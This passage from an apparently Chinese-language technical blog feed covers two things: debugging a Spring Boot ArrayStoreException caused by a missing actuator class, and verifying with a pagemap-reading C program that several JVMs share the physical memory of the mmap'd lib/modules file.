class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>springboot2-demo</code>则是一个简单的spring boot2应用，引用了<code>springboot1-starter</code>模块。</p>
<p>把工程导入IDE，执行<code>springboot2-demo</code>里的<code>ArrayStoreExceptionDemoApplication</code>，抛出的异常是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Caused by: java.lang.ArrayStoreException: sun.reflect.annotation.TypeNotPresentExceptionProxy</span><br><span class="line">	at sun.reflect.annotation.AnnotationParser.parseClassArray(AnnotationParser.java:724) ~[na:1.8.0_112]</span><br><span class="line">	at sun.reflect.annotation.AnnotationParser.parseArray(AnnotationParser.java:531) ~[na:1.8.0_112]</span><br><span class="line">	at sun.reflect.annotation.AnnotationParser.parseMemberValue(AnnotationParser.java:355) ~[na:1.8.0_112]</span><br><span class="line">	at sun.reflect.annotation.AnnotationParser.parseAnnotation2(AnnotationParser.java:286) ~[na:1.8.0_112]</span><br><span class="line">	at sun.reflect.annotation.AnnotationParser.parseAnnotations2(AnnotationParser.java:120) ~[na:1.8.0_112]</span><br><span class="line">	at sun.reflect.annotation.AnnotationParser.parseAnnotations(AnnotationParser.java:72) ~[na:1.8.0_112]</span><br><span class="line">	at java.lang.Class.createAnnotationData(Class.java:3521) ~[na:1.8.0_112]</span><br><span class="line">	at java.lang.Class.annotationData(Class.java:3510) ~[na:1.8.0_112]</span><br><span class="line">	at java.lang.Class.createAnnotationData(Class.java:3526) ~[na:1.8.0_112]</span><br><span class="line">	at java.lang.Class.annotationData(Class.java:3510) ~[na:1.8.0_112]</span><br><span class="line">	at java.lang.Class.getAnnotation(Class.java:3415) ~[na:1.8.0_112]</span><br><span class="line">	at java.lang.reflect.AnnotatedElement.isAnnotationPresent(AnnotatedElement.java:258) ~[na:1.8.0_112]</span><br><span class="line">	at java.lang.Class.isAnnotationPresent(Class.java:3425) ~[na:1.8.0_112]</span><br><span class="line">	at org.springframework.core.annotation.AnnotatedElementUtils.hasAnnotation(AnnotatedElementUtils.java:575) ~[spring-core-5.0.4.RELEASE.jar:5.0.4.RELEASE]</span><br><span class="line">	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.isHandler(RequestMappingHandlerMapping.java:177) ~[spring-webmvc-5.0.4.RELEASE.jar:5.0.4.RELEASE]</span><br><span class="line">	at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.initHandlerMethods(AbstractHandlerMethodMapping.java:217) ~[spring-webmvc-5.0.4.RELEASE.jar:5.0.4.RELEASE]</span><br><span class="line">	at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.afterPropertiesSet(AbstractHandlerMethodMapping.java:188) ~[spring-webmvc-5.0.4.RELEASE.jar:5.0.4.RELEASE]</span><br><span class="line">	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.afterPropertiesSet(RequestMappingHandlerMapping.java:129) ~[spring-webmvc-5.0.4.RELEASE.jar:5.0.4.RELEASE]</span><br><span class="line">	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1769) ~[spring-beans-5.0.4.RELEASE.jar:5.0.4.RELEASE]</span><br><span class="line">	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1706) ~[spring-beans-5.0.4.RELEASE.jar:5.0.4.RELEASE]</span><br><span class="line">	... 16 common frames omitted</span><br></pre></td></tr></table></figure>
<h2 id="使用-Java-Exception-Breakpoint"><a href="#使用-Java-Exception-Breakpoint" class="headerlink" title="使用 Java Exception Breakpoint"></a>使用 Java Exception Breakpoint</h2><p>下面来排查这个问题。</p>
<p>在IDE里，新建一个断点，类型是<code>Java Exception Breakpoint</code>（如果不清楚怎么添加，可以搜索对应IDE的使用文档），异常类是上面抛出来的<code>java.lang.ArrayStoreException</code>。</p>
<p>当断点起效时，查看<code>AnnotationUtils.findAnnotation(Class&lt;?&gt;, Class&lt;A&gt;, Set&lt;Annotation&gt;) line: 686</code> 函数的参数。</p>
<p>可以发现</p>
<ul>
<li>clazz是 <code>class com.example.springboot1starter.MyHealthIndicatorAutoConfiguration$$EnhancerBySpringCGLIB$$945c1f</code></li>
<li>annotationType是 <code>interface org.springframework.boot.actuate.endpoint.annotation.Endpoint</code></li>
</ul>
<p>说明是尝试从<code>MyHealthIndicatorAutoConfiguration</code>里查找<code>@Endpoint</code>信息时出错的。</p>
<p><code>MyHealthIndicatorAutoConfiguration</code>上的确没有<code>@Endpoint</code>，<strong>但是为什么抛出<code>java.lang.ArrayStoreException</code>?</strong></p>
<h2 id="尝试以简单例子复现异常"><a href="#尝试以简单例子复现异常" class="headerlink" title="尝试以简单例子复现异常"></a>尝试以简单例子复现异常</h2><p>首先尝试直接 new MyHealthIndicatorAutoConfiguration ：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">	MyHealthIndicatorAutoConfiguration cc = <span class="keyword">new</span> MyHealthIndicatorAutoConfiguration();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>本以为会抛出异常来，但是发现执行正常。</p>
<p>再仔细看异常栈，可以发现是在<code>at java.lang.Class.getDeclaredAnnotation(Class.java:3458)</code>抛出的异常，则再尝试下面的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">	MyHealthIndicatorAutoConfiguration<span class="class">.<span class="keyword">class</span>.<span class="title">getDeclaredAnnotation</span>(<span class="title">Endpoint</span>.<span class="title">class</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现可以复现异常了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.ArrayStoreException: sun.reflect.annotation.TypeNotPresentExceptionProxy</span><br><span class="line">	at sun.reflect.annotation.AnnotationParser.parseClassArray(AnnotationParser.java:724)</span><br><span class="line">	at sun.reflect.annotation.AnnotationParser.parseArray(AnnotationParser.java:531)</span><br><span class="line">	at sun.reflect.annotation.AnnotationParser.parseMemberValue(AnnotationParser.java:355)</span><br><span class="line">	at sun.reflect.annotation.AnnotationParser.parseAnnotation2(AnnotationParser.java:286)</span><br><span class="line">	at sun.reflect.annotation.AnnotationParser.parseAnnotations2(AnnotationParser.java:120)</span><br><span class="line">	at sun.reflect.annotation.AnnotationParser.parseAnnotations(AnnotationParser.java:72)</span><br><span class="line">	at java.lang.Class.createAnnotationData(Class.java:3521)</span><br><span class="line">	at java.lang.Class.annotationData(Class.java:3510)</span><br><span class="line">	at java.lang.Class.getDeclaredAnnotation(Class.java:3458)</span><br></pre></td></tr></table></figure>
<h2 id="为什么会是java-lang-ArrayStoreException"><a href="#为什么会是java-lang-ArrayStoreException" class="headerlink" title="为什么会是java.lang.ArrayStoreException"></a>为什么会是java.lang.ArrayStoreException</h2><p>再仔细看异常信息：java.lang.ArrayStoreException: sun.reflect.annotation.TypeNotPresentExceptionProxy</p>
<p><code>ArrayStoreException</code>是一个数组越界的异常，它只有一个String信息，并没有<code>cause</code>。</p>
<p>那么我们尝试在 <code>sun.reflect.annotation.TypeNotPresentExceptionProxy</code> 的构造函数里打断点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TypeNotPresentExceptionProxy</span> <span class="keyword">extends</span> <span class="title">ExceptionProxy</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">5565925172427947573L</span>;</span><br><span class="line">    String typeName;</span><br><span class="line">    Throwable cause;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TypeNotPresentExceptionProxy</span><span class="params">(String typeName, Throwable cause)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.typeName = typeName;</span><br><span class="line">        <span class="keyword">this</span>.cause = cause;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在断点里，我们可以发现：</p>
<ul>
<li>typeName是 <code>org.springframework.boot.actuate.autoconfigure.EndpointAutoConfiguration</code></li>
<li>cause是 <code>java.lang.ClassNotFoundException: org.springframework.boot.actuate.autoconfigure.EndpointAutoConfiguration</code></li>
</ul>
<p>终于真相大白了，是找不到<code>org.springframework.boot.actuate.autoconfigure.EndpointAutoConfiguration</code>这个类。</p>
<p>那么它是怎么变成<code>ArrayStoreException</code>的呢？</p>
<p>仔细看下代码，可以发现<code>AnnotationParser.parseClassValue</code>把异常包装成为<code>Object</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//sun.reflect.annotation.AnnotationParser.parseClassValue(ByteBuffer, ConstantPool, Class&lt;?&gt;)</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title">parseClassValue</span><span class="params">(ByteBuffer buf,</span></span></span><br><span class="line"><span class="function"><span class="params">                                          ConstantPool constPool,</span></span></span><br><span class="line"><span class="function"><span class="params">                                          Class&lt;?&gt; container)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> classIndex = buf.getShort() &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                String sig = constPool.getUTF8At(classIndex);</span><br><span class="line">                <span class="keyword">return</span> parseSig(sig, container);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalArgumentException ex) &#123;</span><br><span class="line">                <span class="comment">// support obsolete early jsr175 format class files</span></span><br><span class="line">                <span class="keyword">return</span> constPool.getClassAt(classIndex);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoClassDefFoundError e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> TypeNotPresentExceptionProxy(<span class="string">"[unknown]"</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TypeNotPresentException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> TypeNotPresentExceptionProxy(e.typeName(), e.getCause());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>然后在<code>sun.reflect.annotation.AnnotationParser.parseClassArray(int, ByteBuffer, ConstantPool, Class&lt;?&gt;)</code>里尝试直接设置到数组里</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// sun.reflect.annotation.AnnotationParser.parseClassArray(int, ByteBuffer, ConstantPool, Class&lt;?&gt;)</span></span><br><span class="line">result[i] = parseClassValue(buf, constPool, container);</span><br></pre></td></tr></table></figure>
<p>而这里数组越界了，<code>ArrayStoreException</code>只有越界的<code>Object</code>的类型信息，也就是上面的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.lang.ArrayStoreException: sun.reflect.annotation.TypeNotPresentExceptionProxy</span><br></pre></td></tr></table></figure>
<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>发现是<code>java.lang.ClassNotFoundException: org.springframework.boot.actuate.autoconfigure.EndpointAutoConfiguration</code>，则加上<code>@ConditionalOnClass</code>的检查就可以了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@AutoConfigureBefore</span>(EndpointAutoConfiguration<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">@<span class="title">AutoConfigureAfter</span>(<span class="title">HealthIndicatorAutoConfiguration</span>.<span class="title">class</span>)</span></span><br><span class="line"><span class="class">@<span class="title">ConditionalOnClass</span>(<span class="title">value</span> </span>= &#123;HealthIndicator<span class="class">.<span class="keyword">class</span>, <span class="title">EndpointAutoConfiguration</span>.<span class="title">class</span>&#125;)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">MyHealthIndicatorAutoConfiguration</span> </span>&#123;</span><br></pre></td></tr></table></figure>
<p>准确来说是spring boot2把一些类的package改了：</p>
<p>spring boot 1里类名是：</p>
<ul>
<li>org.springframework.boot.actuate.autoconfigure.EndpointAutoConfiguration</li>
</ul>
<p>spring boot 2里类名是：</p>
<ul>
<li>org.springframework.boot.actuate.autoconfigure.endpoint.EndpointAutoConfiguration</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li><p>当类加载时，并不会加载它的annotation的field所引用的<code>Class&lt;?&gt;</code>，当调用<code>Class.getDeclaredAnnotation(Class&lt;A&gt;)</code>里才会加载</p>
<p>  以上面的例子来说，就是<code>@AutoConfigureBefore(EndpointAutoConfiguration.class)</code>里的<code>EndpointAutoConfiguration</code>并不会和<code>MyHealthIndicatorAutoConfiguration</code>一起被加载。</p>
</li>
<li><p>jdk内部的解析字节码的代码不合理，把<code>ClassNotFoundException</code>异常吃掉了</p>
</li>
<li>排查问题需要一步步深入调试</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring-boot</tag>
        <tag>spring</tag>
        <tag>ClassLoader</tag>
      </tags>
  </entry>
  <entry>
    <title>从java9共享内存加载modules说起</title>
    <url>/java9-mmap-load-modules/</url>
    <content><![CDATA[<h2 id="jdk9后加载lib-modules的方式"><a href="#jdk9后加载lib-modules的方式" class="headerlink" title="jdk9后加载lib/modules的方式"></a>jdk9后加载lib/modules的方式</h2><p>从jdk的代码里可以看出来，默认的实现加载<code>lib/modules</code>是用mmap来加载的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class NativeImageBuffer &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        java.security.AccessController.doPrivileged(</span><br><span class="line">                new java.security.PrivilegedAction&lt;Void&gt;() &#123;</span><br><span class="line">                    public Void run() &#123;</span><br><span class="line">                        System.loadLibrary(&quot;jimage&quot;);</span><br><span class="line">                        return null;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    native static ByteBuffer getNativeMap(String imagePath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在jimage动态库里最终是一个cpp实现的<code>ImageFileReader</code>来读取的。它在64位os上使用的是mmap方式：</p>
<p><a href="https://github.com/dmlloyd/openjdk/blob/jdk/jdk10/src/java.base/share/native/libjimage/imageFile.cpp#L44" target="_blank" rel="noopener">https://github.com/dmlloyd/openjdk/blob/jdk/jdk10/src/java.base/share/native/libjimage/imageFile.cpp#L44</a></p>
<p>通过共享内存启动多个jvm时会有好处：</p>
<ul>
<li>减少内存占用</li>
<li>加快启动速度</li>
</ul>
<p><strong>突然有个想法，怎么验证多个jvm的确共享了内存？</strong> </p>
<p>下面来验证一下，思路是：</p>
<ol>
<li>先获取进程的mmap信息</li>
<li>获取jvm进程映射<code>modules</code>的虚拟地址</li>
<li>从虚拟地址转换为物理地址</li>
<li>启动两个jvm进程，计算它们映射<code>modules</code>是否物理地址是一样的</li>
</ol>
<h3 id="linux下查看进程的mmap信息"><a href="#linux下查看进程的mmap信息" class="headerlink" title="linux下查看进程的mmap信息"></a>linux下查看进程的mmap信息</h3><ol>
<li>使用<code>pmap -x $pid</code>命令</li>
<li>直接查看 <code>cat /proc/$pid/maps</code>文件的内容</li>
</ol>
<p>启动一个jshell之后，用pmap查看mmap信息，其中RSS（resident set size）列表示真实占用的内存。：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ pmap -x 24615</span><br><span class="line">24615:   jdk9/jdk-9.0.4/bin/jshell</span><br><span class="line">Address           Kbytes     RSS   Dirty Mode  Mapping</span><br><span class="line">0000000000400000       4       4       0 r-x-- jshell</span><br><span class="line">0000000000601000       4       4       4 rw--- jshell</span><br><span class="line">000000000111b000     132     120     120 rw---   [ anon ]</span><br><span class="line">...</span><br><span class="line">00007f764192c000      88      64       0 r-x-- libnet.so</span><br><span class="line">00007f7641942000    2048       0       0 ----- libnet.so</span><br><span class="line">00007f7641b42000       4       4       4 rw--- libnet.so</span><br><span class="line">00007f7641b43000    2496     588     588 rwx--   [ anon ]</span><br><span class="line">...</span><br><span class="line">00007f7650b43000  185076    9880       0 r--s- modules</span><br><span class="line">00007f765c000000    5172    5124    5124 rw---   [ anon ]</span><br><span class="line"></span><br><span class="line">---------------- ------- ------- -------</span><br><span class="line">total kB         2554068  128756  106560</span><br></pre></td></tr></table></figure>
<p>我们可以找到<code>modules</code>文件的信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00007f7650b43000  185076    9880       0 r--s- modules</span><br></pre></td></tr></table></figure>
<p>它的文件映射大小是185076kb，实际使用内存大小是9880kb。</p>
<h3 id="linux-kernel关于pagemap的说明"><a href="#linux-kernel关于pagemap的说明" class="headerlink" title="linux kernel关于pagemap的说明"></a>linux kernel关于pagemap的说明</h3><p>上面我们获取到了<code>modules</code>的虚拟地址，但是还需要转换为物理地址。</p>
<p>正常来说一个进程是没有办法知道它自己的虚拟地址对应的是什么物理地址。不过我们用linux kernel提供的信息可以读取，转换为物理地址。</p>
<p>linux每个进程都有个<code>/proc/$pid/pagemap</code>文件，里面记录了内存页的信息：</p>
<p><a href="https://www.kernel.org/doc/Documentation/vm/pagemap.txt" target="_blank" rel="noopener">https://www.kernel.org/doc/Documentation/vm/pagemap.txt</a></p>
<p>简而言之，在pagemap里每一个virtual page都有一个对应的64 bit的信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">* Bits 0-54  page frame number (PFN) if present</span><br><span class="line">* Bits 0-4   swap type if swapped</span><br><span class="line">* Bits 5-54  swap offset if swapped</span><br><span class="line">* Bit  55    pte is soft-dirty (see Documentation/vm/soft-dirty.txt)</span><br><span class="line">* Bit  56    page exclusively mapped (since 4.2)</span><br><span class="line">* Bits 57-60 zero</span><br><span class="line">* Bit  61    page is file-page or shared-anon (since 3.5)</span><br><span class="line">* Bit  62    page swapped</span><br><span class="line">* Bit  63    page present</span><br></pre></td></tr></table></figure>
<p>只要把虚拟地址转换为pagemap文件里的offset，就可以读取具体的virtual page信息。计算方法是：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// getpagesize()是系统调用</span></span><br><span class="line"><span class="comment">// 64bit是8字节</span></span><br><span class="line"><span class="keyword">long</span> virtualPageIndex = virtualAddress / getpagesize()</span><br><span class="line">offset = virtualPageIndex * <span class="number">8</span></span><br></pre></td></tr></table></figure>
<p>从offset里读取出来的64bit里，可以获取到page frame number，如果想要得到真正的物理地址，还需要再转换：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// pageFrameNumber * getpagesize() 获取page的开始地址</span></span><br><span class="line"><span class="comment">// virtualAddress % getpagesize() 获取到page里的偏移地址</span></span><br><span class="line"><span class="keyword">long</span> pageFrameNumber = <span class="comment">// read from pagemap file</span></span><br><span class="line">physicalAddress = pageFrameNumber * getpagesize() + virtualAddress % getpagesize();</span><br></pre></td></tr></table></figure>
<h3 id="虚拟地址转换物理地址的代码"><a href="#虚拟地址转换物理地址的代码" class="headerlink" title="虚拟地址转换物理地址的代码"></a>虚拟地址转换物理地址的代码</h3><p>参考这里的代码：<a href="https://github.com/cirosantilli/linux-kernel-module-cheat/blob/master/kernel_module/user/common.h" target="_blank" rel="noopener">https://github.com/cirosantilli/linux-kernel-module-cheat/blob/master/kernel_module/user/common.h</a></p>
<p>得到的一个从虚拟地址转换为物理地址的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _POSIX_C_SOURCE 200809L</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt; /* open */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt; /* uint64_t  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; /* size_t */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; /* pread, sysconf */</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> BUFSIZ = <span class="number">1024</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> pfn : <span class="number">54</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> soft_dirty : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> file_page : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> swapped : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> present : <span class="number">1</span>;</span><br><span class="line">&#125; PagemapEntry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Parse the pagemap entry for the given virtual address.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param[out] entry      the parsed entry</span></span><br><span class="line"><span class="comment"> * @param[in]  pagemap_fd file descriptor to an open /proc/pid/pagemap file</span></span><br><span class="line"><span class="comment"> * @param[in]  vaddr      virtual address to get entry for</span></span><br><span class="line"><span class="comment"> * @return 0 for success, 1 for failure</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pagemap_get_entry</span><span class="params">(PagemapEntry *entry, <span class="keyword">int</span> pagemap_fd, <span class="keyword">uintptr_t</span> vaddr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> nread;</span><br><span class="line">    <span class="keyword">ssize_t</span> ret;</span><br><span class="line">    <span class="keyword">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    nread = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (nread &lt; <span class="keyword">sizeof</span>(data)) &#123;</span><br><span class="line">        ret = pread(pagemap_fd, &amp;data, <span class="keyword">sizeof</span>(data),</span><br><span class="line">                (vaddr / sysconf(_SC_PAGE_SIZE)) * <span class="keyword">sizeof</span>(data) + nread);</span><br><span class="line">        nread += ret;</span><br><span class="line">        <span class="keyword">if</span> (ret &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    entry-&gt;pfn = data &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">54</span>) - <span class="number">1</span>);</span><br><span class="line">    entry-&gt;soft_dirty = (data &gt;&gt; <span class="number">54</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    entry-&gt;file_page = (data &gt;&gt; <span class="number">61</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    entry-&gt;swapped = (data &gt;&gt; <span class="number">62</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    entry-&gt;present = (data &gt;&gt; <span class="number">63</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Convert the given virtual address to physical using /proc/PID/pagemap.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param[out] paddr physical address</span></span><br><span class="line"><span class="comment"> * @param[in]  pid   process to convert for</span></span><br><span class="line"><span class="comment"> * @param[in] vaddr virtual address to get entry for</span></span><br><span class="line"><span class="comment"> * @return 0 for success, 1 for failure</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">virt_to_phys_user</span><span class="params">(<span class="keyword">uintptr_t</span> *paddr, <span class="keyword">pid_t</span> pid, <span class="keyword">uintptr_t</span> vaddr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> pagemap_file[BUFSIZ];</span><br><span class="line">    <span class="keyword">int</span> pagemap_fd;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">snprintf</span>(pagemap_file, <span class="keyword">sizeof</span>(pagemap_file), <span class="string">"/proc/%ju/pagemap"</span>, (<span class="keyword">uintmax_t</span>)pid);</span><br><span class="line">    pagemap_fd = open(pagemap_file, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (pagemap_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    PagemapEntry entry;</span><br><span class="line">    <span class="keyword">if</span> (pagemap_get_entry(&amp;entry, pagemap_fd, vaddr)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    close(pagemap_fd);</span><br><span class="line">    *paddr = (entry.pfn * sysconf(_SC_PAGE_SIZE)) + (vaddr % sysconf(_SC_PAGE_SIZE));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *end;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line">    <span class="keyword">uintptr_t</span> virt_addr;</span><br><span class="line">    <span class="keyword">uintptr_t</span> paddr;</span><br><span class="line">    <span class="keyword">int</span> return_code;</span><br><span class="line"></span><br><span class="line">    pid = strtol(argv[<span class="number">1</span>],&amp;end, <span class="number">10</span>);</span><br><span class="line">    virt_addr = strtol(argv[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    return_code = virt_to_phys_user(&amp;paddr, pid, virt_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(return_code == <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Vaddr: 0x%lx, paddr: 0x%lx \n"</span>, virt_addr, paddr);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另外，收集到一些可以读取pagemap信息的工具：</p>
<ul>
<li><a href="https://github.com/dwks/pagemap" target="_blank" rel="noopener">https://github.com/dwks/pagemap</a></li>
</ul>
<h3 id="检查两个jvm进程是否映射modules的物理地址一致"><a href="#检查两个jvm进程是否映射modules的物理地址一致" class="headerlink" title="检查两个jvm进程是否映射modules的物理地址一致"></a>检查两个jvm进程是否映射<code>modules</code>的物理地址一致</h3><ol>
<li><p>先启动两个jshell</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ jps</span><br><span class="line">25105 jdk.internal.jshell.tool.JShellToolProvider</span><br><span class="line">25142 jdk.internal.jshell.tool.JShellToolProvider</span><br></pre></td></tr></table></figure>
</li>
<li><p>把上面转换地址的代码保存为<code>mymap.c</code>，再编绎</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc mymap.c -o mymap</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取两个jvm的modules的虚拟地址，并转换为物理地址</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ pmap -x 25105 | grep modules</span><br><span class="line">00007f82b4b43000  185076    9880       0 r--s- modules</span><br><span class="line">$ sudo ./mymap 25105 00007f82b4b43000</span><br><span class="line">Vaddr: 0x7f82b4b43000, paddr: 0x33598000</span><br><span class="line"></span><br><span class="line">$ pmap -x 25142 | grep modules</span><br><span class="line">00007ff220504000  185076   10064       0 r--s- modules</span><br><span class="line">$ sudo ./mymap 25142 00007ff220504000</span><br><span class="line">Vaddr: 0x7ff220504000, paddr: 0x33598000</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>可以看到两个jvm进程映射<code>modules</code>的物理地址是一样的，证实了最开始的想法。</p>
<h3 id="kernel-里的-page-types-工具"><a href="#kernel-里的-page-types-工具" class="headerlink" title="kernel 里的 page-types 工具"></a>kernel 里的 page-types 工具</h3><p>其实在kernel里自带有一个工具<code>page-types</code>可以输出一个page信息，可以通过下面的方式来获取内核源码，然后自己编绎：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get <span class="built_in">source</span> linux-image-$(uname -r)</span><br><span class="line">sudo apt-get build-dep linux-image-$(uname -r)</span><br></pre></td></tr></table></figure>
<p>到<code>tools/vm</code>目录下面，可以直接<code>sudo make</code>编绎。</p>
